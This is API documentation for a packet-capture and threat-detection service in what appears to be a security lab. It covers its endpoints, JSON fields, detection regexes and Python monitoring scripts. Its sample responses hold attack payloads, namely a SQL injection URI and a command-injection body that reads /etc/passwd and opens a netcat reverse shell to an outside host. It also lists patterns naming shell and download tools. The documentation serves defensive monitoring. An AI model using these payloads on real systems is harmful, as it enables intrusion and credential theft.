# Packet Monitor API Documentation

## API Base URL
- **Agent Network Access**: `http://192.168.200.2:6000`
- **Host Access**: `http://localhost:6000`

## Endpoints

### 1. Health Check
**GET** `/health`

Check if the packet monitor service is running.

**Response:**
```json
{
  "status": "healthy",
  "service": "packet-monitor", 
  "running": true,
  "total_packets": 1234,
  "timestamp": "2025-06-02T10:30:45.123456"
}
```

### 2. Packets Endpoint
**GET** `/packets`

Retrieve captured packets with extensive filtering, HTTP payload analysis, and optional additional data.

**Query Parameters:**

#### Filtering Parameters
- `limit` (int): Maximum number of packets to return (default: 100)
- `since` (ISO timestamp): Get packets since this timestamp
- `protocol` (string): Filter by protocol (TCP, UDP, ICMP)
- `direction` (string): Filter by direction (inbound, outbound, internal, external)
- `recent` (int): Get packets from last X minutes (e.g., `recent=5` for last 5 minutes)

#### Optional Data Parameters
- `stats` (boolean): Include statistics summary (`stats=true`)
- `protocols` (boolean): Include protocol distribution (`protocols=true`)
- `flows` (boolean): Include top traffic flows (`flows=true`)
- `raw_only` (boolean): Return only raw tcpdump lines (`raw_only=true`)

**Examples:**
```bash
# Basic: Get last 50 TCP packets
GET /packets?protocol=TCP&limit=50

# Security monitoring: HTTP attacks from attacker network
GET /packets?protocol=TCP&application=HTTP&direction=outbound&recent=10

# Threat hunting: All outbound traffic with statistics
GET /packets?direction=outbound&limit=100&stats=true

# Recent with all extras: Last 5 minutes with stats, protocols, and flows
GET /packets?recent=5&stats=true&protocols=true&flows=true

# Raw mode: Get only tcpdump raw output for agent processing
GET /packets?limit=200&raw_only=true

# Time-based: Get packets since specific time with protocol summary
GET /packets?since=2025-06-02T10:00:00&protocols=true
```

**Standard Response with HTTP Payload Analysis:**
```json
{
  "timestamp": "2025-06-02T10:30:45.123456",
  "count": 50,
  "total_captured": 1234,
  "packets": [
    {
      "timestamp": "2025-06-02T10:30:45.123456",
      "packet_id": 1234,
      "protocol": "TCP",
      "source_ip": "192.168.100.10",
      "source_port": 54321,
      "dest_ip": "172.20.0.2",
      "dest_port": 80,
      "direction": "outbound",
      "application": "HTTP",
      "flags_info": "Flags [P.]",
      "capture_time": 1717325445.123456,
      "raw_header": "10:30:45.123456 IP 192.168.100.10.54321 > 172.20.0.2.80: Flags [P.]",
      "raw_payload": "GET /admin/login.php?user=admin'OR'1'='1 HTTP/1.1\nHost: 172.20.0.2\nUser-Agent: curl/7.68.0",
      "http_type": "request",
      "http_method": "GET",
      "http_uri": "/admin/login.php?user=admin'OR'1'='1",
      "http_version": "1.1",
      "http_headers": {
        "host": "172.20.0.2",
        "user-agent": "curl/7.68.0"
      },
      "suspicious_uri_patterns": ["SQL injection pattern: ('|\")\\s*(or|and)\\s*('|\")?.*('|\")\\s*=\\s*('|\")"]
    }
  ]
}
```

**HTTP POST with Command Injection Example:**
```json
{
  "timestamp": "2025-06-02T10:31:22.456789",
  "packet_id": 1235,
  "protocol": "TCP",
  "source_ip": "192.168.100.15",
  "source_port": 45678,
  "dest_ip": "172.20.0.5", 
  "dest_port": 80,
  "direction": "outbound",
  "application": "HTTP",
  "flags_info": "Flags [P.]",
  "capture_time": 1717325482.456789,
  "raw_header": "10:31:22.456789 IP 192.168.100.15.45678 > 172.20.0.5.80: Flags [P.]",
  "raw_payload": "POST /upload.php HTTP/1.1\nHost: 172.20.0.5\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 45\n\ncmd=cat /etc/passwd; nc 192.168.100.15 4444 -e /bin/bash",
  "http_type": "request",
  "http_method": "POST", 
  "http_uri": "/upload.php",
  "http_version": "1.1",
  "http_headers": {
    "host": "172.20.0.5",
    "content-type": "application/x-www-form-urlencoded",
    "content-length": "45"
  },
  "http_body": "cmd=cat /etc/passwd; nc 192.168.100.15 4444 -e /bin/bash",
  "suspicious_patterns": [
    "Command injection pattern: (;|\\||&|`|\\$\\())\\s*(cat|ls|pwd|whoami|id|uname|ps|netstat|ifconfig)",
    "Reverse shell pattern: (nc|netcat|bash|sh)\\s+.*\\s+\\d+\\s*-e"
  ]
}
```

**Raw Mode Response (raw_only=true):**
```json
{
  "timestamp": "2025-06-02T10:30:45.123456",
  "count": 50,
  "total_captured": 1234,
  "raw_lines": [
    "10:30:45.123456 IP 192.168.100.10.54321 > 172.20.0.2.80: Flags [P.]",
    "10:30:46.234567 IP 172.20.0.2.80 > 192.168.100.10.54321: Flags [P.]",
    "10:30:47.345678 IP 192.168.100.10.54321 > 172.20.0.2.80: Flags [F.]"
  ]
}
```

**With Enhanced Security Statistics (stats=true):**
```json
{
  "timestamp": "2025-06-02T10:30:45.123456",
  "count": 50,
  "total_captured": 1234,
  "packets": [...],
  "statistics": {
    "total_packets": 1234,
    "memory_packets": 1000,
    "running": true,
    "stats": {
      "protocol_TCP": 800,
      "protocol_UDP": 200,
      "protocol_ICMP": 234,
      "direction_outbound": 600,
      "direction_inbound": 400,
      "app_HTTP": 300,
      "app_HTTPS": 150,
      "security_threats": 25,
      "threat_command_injection": 12,
      "threat_sql_injection": 8,
      "threat_reverse_shell": 3,
      "threat_xss": 2,
      "threat_path_traversal": 1
    }
  }
}
```

### 3. Control Endpoints
**POST** `/control/start` - Start packet monitoring with HTTP analysis
**POST** `/control/stop` - Stop packet monitoring

**Start Response:**
```json
{
  "message": "Monitoring started successfully"
}
```

**Stop Response:**
```json
{
  "message": "Monitoring stopped"
}
```

## Enhanced Packet Data Structure

Each packet contains the following fields:

### Common Fields
- `timestamp`: ISO format timestamp
- `packet_id`: Unique packet identifier
- `protocol`: Protocol type (TCP, UDP, ICMP)
- `source_ip`: Source IP address
- `dest_ip`: Destination IP address
- `direction`: Traffic direction relative to attacker network
- `capture_time`: Unix timestamp
- `raw_header`: Original tcpdump packet header line
- `raw_payload`: Raw packet payload (when available)

### TCP Specific Fields
- `source_port`: Source port number
- `dest_port`: Destination port number
- `flags_info`: TCP flags information
- `application`: Detected application (HTTP, HTTPS, SSH, FTP, etc.)

### UDP Specific Fields
- `source_port`: Source port number
- `dest_port`: Destination port number
- `application`: Detected application (DNS, DHCP, NTP, etc.)

### ICMP Specific Fields
- `icmp_info`: ICMP packet details

### 🆕 HTTP Payload Fields (Security Enhanced)
**Note**: HTTP payload parsing only occurs for HTTP traffic from attacker network (192.168.100.x) to detect malicious activities.

#### HTTP Request Fields
- `http_type`: "request" or "response"
- `http_method`: HTTP method (GET, POST, PUT, DELETE, etc.)
- `http_uri`: Requested URI/path
- `http_version`: HTTP version (1.0, 1.1, 2.0)
- `http_headers`: Object containing HTTP headers (keys in lowercase)
- `http_body`: HTTP request/response body content (for POST requests)

#### HTTP Response Fields  
- `http_type`: "response"
- `http_version`: HTTP version
- `http_status_code`: HTTP status code (200, 404, 500, etc.)
- `http_status_message`: HTTP status message ("OK", "Not Found", etc.)
- `http_headers`: Object containing HTTP headers
- `http_body`: Response body content (truncated to 1000 chars)

#### 🛡️ Security Analysis Fields
- `suspicious_patterns`: Array of detected malicious patterns in HTTP body
- `suspicious_uri_patterns`: Array of detected malicious patterns in URI

### Automatic Threat Detection Patterns

The system automatically detects the following attack patterns in HTTP traffic:

#### 1. **Command Injection Detection**
```regex
(;|\||&|`|\$\()\s*(cat|ls|pwd|whoami|id|uname|ps|netstat|ifconfig)
(nc|netcat|bash|sh|cmd|powershell)\s+.*\s+\d+
/bin/(bash|sh|cat|ls|ps)
(wget|curl)\s+http
(chmod|chown)\s+\d+
(rm|del)\s+-rf?
echo\s+.*\s*>\s*/tmp/
```

#### 2. **SQL Injection Detection**
```regex
(union|select|insert|update|delete|drop|create|alter)\s+.*\s+(from|into|table|database)
('|")\s*(or|and)\s*('|")?.*('|")\s*=\s*('|")
(or|and)\s+\d+\s*=\s*\d+
;\s*(select|insert|update|delete|drop)
```

#### 3. **Cross-Site Scripting (XSS) Detection**
```regex
<script[^>]*>.*</script>
javascript:
on(load|click|error|focus|blur)\s*=
(alert|confirm|prompt)\s*\(
```

#### 4. **Path Traversal Detection**
- `../` or `..\\` patterns

#### 5. **Reverse Shell Detection**
```regex
(nc|netcat|bash|sh)\s+.*\s+\d+\s*-e
(python|perl|ruby|php)\s+.*socket
/dev/tcp/.*:\d+
exec\s*\(.*socket
```

### Example Threat Detection Output
```json
{
  "http_body": "cmd=cat /etc/passwd; nc 192.168.100.15 4444 -e /bin/bash",
  "suspicious_patterns": [
    "Command injection pattern: (;|\\||&|`|\\$\\())\\s*(cat|ls|pwd|whoami|id|uname|ps|netstat|ifconfig)",
    "Reverse shell pattern: (nc|netcat|bash|sh)\\s+.*\\s+\\d+\\s*-e"
  ]
}
```

## Traffic Direction Values
- `outbound`: From attacker network (192.168.100.x) to external
- `inbound`: From external to attacker network
- `internal`: Within attacker network
- `external`: Neither source nor destination in attacker network

## AI Agent Usage Examples for Security Monitoring

### 1. Real-Time Attack Detection
```python
# Monitor for immediate threats from attacker network
response = requests.get(
    "http://192.168.200.2:6000/packets?"
    "direction=outbound&protocol=TCP&application=HTTP&recent=5"
)
packets = response.json()["packets"]

# Check for active attacks
for packet in packets:
    if 'suspicious_patterns' in packet:
        print(f"🚨 ACTIVE ATTACK DETECTED!")
        print(f"   Attacker: {packet['source_ip']}:{packet['source_port']}")
        print(f"   Target: {packet['dest_ip']}:{packet['dest_port']}")
        print(f"   Method: {packet.get('http_method', 'N/A')}")
        print(f"   URI: {packet.get('http_uri', 'N/A')}")
        print(f"   Threats: {packet['suspicious_patterns']}")
        
        # Trigger immediate response
        # - Block IP in firewall
        # - Send alert to SOC
        # - Log to SIEM
```

### 2. Command Injection Monitoring
```python
# Specifically hunt for command injection attempts
response = requests.get(
    "http://192.168.200.2:6000/packets?"
    "application=HTTP&direction=outbound&recent=10"
)
packets = response.json()["packets"]

command_injections = []
for packet in packets:
    if 'suspicious_patterns' in packet:
        for pattern in packet['suspicious_patterns']:
            if 'command injection' in pattern.lower():
                command_injections.append({
                    'timestamp': packet['timestamp'],
                    'source': packet['source_ip'],
                    'target': packet['dest_ip'],
                    'method': packet.get('http_method'),
                    'uri': packet.get('http_uri'),
                    'payload': packet.get('http_body', 'N/A'),
                    'pattern': pattern
                })

if command_injections:
    print(f"💀 Found {len(command_injections)} command injection attempts!")
    for cmd_inj in command_injections:
        print(f"   {cmd_inj['source']} -> {cmd_inj['target']}: {cmd_inj['payload'][:100]}...")
```

### 3. Reverse Shell Detection
```python
# Hunt for reverse shell attempts
response = requests.get(
    "http://192.168.200.2:6000/packets?"
    "direction=outbound&recent=30&limit=500"
)
packets = response.json()["packets"]

reverse_shells = []
for packet in packets:
    # Check for reverse shell patterns
    if 'suspicious_patterns' in packet:
        for pattern in packet['suspicious_patterns']:
            if 'reverse shell' in pattern.lower():
                reverse_shells.append({
                    'attacker_ip': packet['source_ip'],
                    'target_ip': packet['dest_ip'],
                    'method': packet.get('http_method', 'N/A'),
                    'uri': packet.get('http_uri', 'N/A'),
                    'shell_command': packet.get('http_body', 'N/A'),
                    'timestamp': packet['timestamp']
                })

if reverse_shells:
    print(f"🔴 CRITICAL: {len(reverse_shells)} reverse shell attempts detected!")
    for shell in reverse_shells:
        print(f"   Attacker: {shell['attacker_ip']}")
        print(f"   Target: {shell['target_ip']}")
        print(f"   Command: {shell['shell_command']}")
        print(f"   Time: {shell['timestamp']}")
        print("---")
```

### 4. SQL Injection Analysis
```python
# Monitor for SQL injection attacks
response = requests.get(
    "http://192.168.200.2:6000/packets?"
    "application=HTTP&direction=outbound&recent=15"
)
packets = response.json()["packets"]

sql_attacks = {'uri_based': [], 'post_based': []}

for packet in packets:
    # Check URI for SQL injection
    if 'suspicious_uri_patterns' in packet:
        for pattern in packet['suspicious_uri_patterns']:
            if 'sql injection' in pattern.lower():
                sql_attacks['uri_based'].append({
                    'source': packet['source_ip'],
                    'target': packet['dest_ip'],
                    'uri': packet.get('http_uri', ''),
                    'pattern': pattern
                })
    
    # Check POST body for SQL injection
    if 'suspicious_patterns' in packet:
        for pattern in packet['suspicious_patterns']:
            if 'sql injection' in pattern.lower():
                sql_attacks['post_based'].append({
                    'source': packet['source_ip'],
                    'target': packet['dest_ip'],
                    'body': packet.get('http_body', ''),
                    'pattern': pattern
                })

print(f"💉 SQL Injection Summary:")
print(f"   URI-based attacks: {len(sql_attacks['uri_based'])}")
print(f"   POST-based attacks: {len(sql_attacks['post_based'])}")
```

### 5. Comprehensive Threat Intelligence
```python
# Generate complete threat landscape report
response = requests.get(
    "http://192.168.200.2:6000/packets?"
    "limit=500&stats=true&protocols=true&flows=true&recent=60"
)
data = response.json()

packets = data["packets"]
stats = data["statistics"]

# Analyze threat landscape
threat_intel = {
    'total_packets': len(packets),
    'total_threats': stats['stats'].get('security_threats', 0),
    'threat_breakdown': {
        'command_injection': stats['stats'].get('threat_command_injection', 0),
        'sql_injection': stats['stats'].get('threat_sql_injection', 0),
        'xss': stats['stats'].get('threat_xss', 0),
        'reverse_shell': stats['stats'].get('threat_reverse_shell', 0),
        'path_traversal': stats['stats'].get('threat_path_traversal', 0)
    },
    'top_attackers': {},
    'top_targets': {},
    'attack_timeline': []
}

# Identify most active attackers and targets
for packet in packets:
    if 'suspicious_patterns' in packet:
        # Track attackers
        attacker = packet['source_ip']
        threat_intel['top_attackers'][attacker] = threat_intel['top_attackers'].get(attacker, 0) + 1
        
        # Track targets
        target = packet['dest_ip']
        threat_intel['top_targets'][target] = threat_intel['top_targets'].get(target, 0) + 1
        
        # Build timeline
        threat_intel['attack_timeline'].append({
            'time': packet['timestamp'],
            'attacker': attacker,
            'target': target,
            'threats': packet['suspicious_patterns']
        })

# Sort by activity
threat_intel['top_attackers'] = dict(sorted(threat_intel['top_attackers'].items(), key=lambda x: x[1], reverse=True)[:10])
threat_intel['top_targets'] = dict(sorted(threat_intel['top_targets'].items(), key=lambda x: x[1], reverse=True)[:10])

print("🎯 THREAT INTELLIGENCE REPORT")
print(f"Total Threats Detected: {threat_intel['total_threats']}")
print(f"Threat Breakdown: {threat_intel['threat_breakdown']}")
print(f"Most Active Attackers: {threat_intel['top_attackers']}")
print(f"Most Targeted Systems: {threat_intel['top_targets']}")
```

### 6. Real-Time Security Stream
```python
import time
from datetime import datetime

def security_monitoring_stream():
    """Continuous real-time security monitoring"""
    last_check = datetime.now()
    
    print("🛡️  Starting real-time security monitoring...")
    
    while True:
        try:
            # Get new HTTP packets with potential threats
            response = requests.get(
                f"http://192.168.200.2:6000/packets?"
                f"since={last_check.isoformat()}&protocol=TCP&application=HTTP&direction=outbound"
            )
            
            new_packets = response.json()["packets"]
            
            for packet in new_packets:
                # Immediate alerting for any suspicious activity
                if 'suspicious_patterns' in packet or 'suspicious_uri_patterns' in packet:
                    
                    # Determine threat severity
                    threat_level = "HIGH"
                    threats = packet.get('suspicious_patterns', []) + packet.get('suspicious_uri_patterns', [])
                    
                    if any('reverse shell' in t.lower() for t in threats):
                        threat_level = "CRITICAL"
                    elif any('command injection' in t.lower() for t in threats):
                        threat_level = "HIGH"
                    elif any('sql injection' in t.lower() for t in threats):
                        threat_level = "MEDIUM"
                    
                    # Real-time alert
                    alert = {
                        'severity': threat_level,
                        'timestamp': packet['timestamp'],
                        'attacker': f"{packet['source_ip']}:{packet['source_port']}",
                        'target': f"{packet['dest_ip']}:{packet['dest_port']}",
                        'method': packet.get('http_method', 'N/A'),
                        'uri': packet.get('http_uri', 'N/A')[:100],
                        'payload': packet.get('http_body', 'N/A')[:200],
                        'threats': threats
                    }
                    
                    print(f"\n🚨 [{alert['severity']}] SECURITY ALERT")
                    print(f"   Time: {alert['timestamp']}")
                    print(f"   Attack: {alert['attacker']} -> {alert['target']}")
                    print(f"   Method: {alert['method']} {alert['uri']}")
                    if alert['payload'] != 'N/A':
                        print(f"   Payload: {alert['payload']}...")
                    print(f"   Threats: {alert['threats']}")
                    
                    # Here you could:
                    # - Send to SIEM system
                    # - Trigger firewall block
                    # - Send email/Slack notification
                    # - Write to security database
                    # - Initiate incident response
            
            last_check = datetime.now()
            time.sleep(3)  # Check every 3 seconds
            
        except Exception as e:
            print(f"❌ Error in security monitoring: {e}")
            time.sleep(10)

# Start continuous monitoring
security_monitoring_stream()
```

## Performance Considerations

### HTTP Payload Capture Impact
- **Data Size**: HTTP payload capture significantly increases packet data size (3-5x larger)
- **Memory Usage**: Packets with payloads consume more memory in the circular buffer
- **Processing**: Threat detection adds ~10-20ms CPU overhead per HTTP packet
- **Network**: Larger JSON responses when including payloads (2-5MB for 100 packets)

### Recommendations for Production Use
1. **Use Targeted Filtering**: Apply `protocol=TCP&application=HTTP&direction=outbound` for security monitoring
2. **Limit Results**: Use `limit` parameter to control response size (recommended: 50-200 packets)
3. **Recent Data Only**: Use `recent=X` instead of large time ranges (recommended: 5-30 minutes)
4. **Raw Mode for Performance**: Use `raw_only=true` if you don't need parsed HTTP data
5. **Focused Monitoring**: Monitor only `direction=outbound` for attacker traffic analysis

### Optimal Usage Patterns
```bash
# Light monitoring - check for recent activity
GET /packets?recent=5&limit=50&stats=true

# Focused threat hunting - HTTP attacks only  
GET /packets?protocol=TCP&application=HTTP&direction=outbound&recent=10

# Deep security analysis - full payload inspection
GET /packets?direction=outbound&recent=5&limit=100

# High-frequency polling - minimal data transfer
GET /packets?since=2025-06-02T10:30:00&raw_only=true&limit=50

# Comprehensive threat intelligence - full analysis
GET /packets?recent=30&stats=true&protocols=true&flows=true&limit=200
```

## Security Monitoring Best Practices

### 1. **Layered Detection Strategy**
- **Real-time monitoring**: 3-5 second polling for immediate threats
- **Periodic analysis**: 5-minute deep scans for pattern analysis
- **Historical analysis**: Hourly/daily trend analysis

### 2. **Alert Prioritization**
- **CRITICAL**: Reverse shells, RCE attempts
- **HIGH**: Command injection, file uploads
- **MEDIUM**: SQL injection, XSS
- **LOW**: Path traversal, information disclosure

### 3. **Response Automation**
```python
# Example automated response framework
def handle_security_alert(packet):
    threat_level = determine_threat_level(packet)
    
    if threat_level == "CRITICAL":
        # Immediate action
        block_ip_in_firewall(packet['source_ip'])
        send_emergency_alert(packet)
        create_incident_ticket(packet)
    elif threat_level == "HIGH":
        # Rapid response
        flag_for_investigation(packet)
        notify_security_team(packet)
    else:
        # Log and monitor
        log_to_siem(packet)
```

## Benefits of Enhanced Security Design

1. **Comprehensive Threat Detection**: Automatic identification of common attack patterns
2. **Real-Time Security Monitoring**: Immediate alerting for active attacks
3. **Detailed Forensics**: Full HTTP payload capture for incident analysis
4. **Scalable Architecture**: Efficient filtering and processing for high-volume environments
5. **AI-Ready Data**: Structured JSON output optimized for machine learning analysis
6. **Backward Compatibility**: Existing integrations continue to work with enhanced data
7. **Focused Security Scope**: Only analyzes traffic from attacker network to reduce noise
8. **Actionable Intelligence**: Specific threat patterns enable automated response

## Error Handling
All endpoints return appropriate HTTP status codes:
- `200`: Success
- `400`: Bad request (invalid parameters)
- `500`: Internal server error

Error responses include:
```json
{
  "error": "Error description"
}
```

## Logging and Alerting
The enhanced packet monitor provides comprehensive logging:

### Security Alert Logs
```
2025-06-02 10:31:22 - WARNING - SECURITY ALERT: Suspicious HTTP traffic detected from 192.168.100.15 to 172.20.0.5
2025-06-02 10:31:22 - WARNING -   Method: POST URI: /upload.php
2025-06-02 10:31:22 - WARNING -   Threats: ['Command injection pattern: (;|\\||&)\\s*(cat|ls|pwd)', 'Reverse shell pattern: nc.*\\d+\\s*-e']
```

### Progress Logs
```
2025-06-02 10:30:00 - INFO - Starting tcpdump with HTTP payload analysis: tcpdump -i any -n -A -s 65535 -l (...)
2025-06-02 10:30:00 - INFO - Packet capture with HTTP analysis started successfully
2025-06-02 10:31:40 - INFO - Captured 100 packets
```

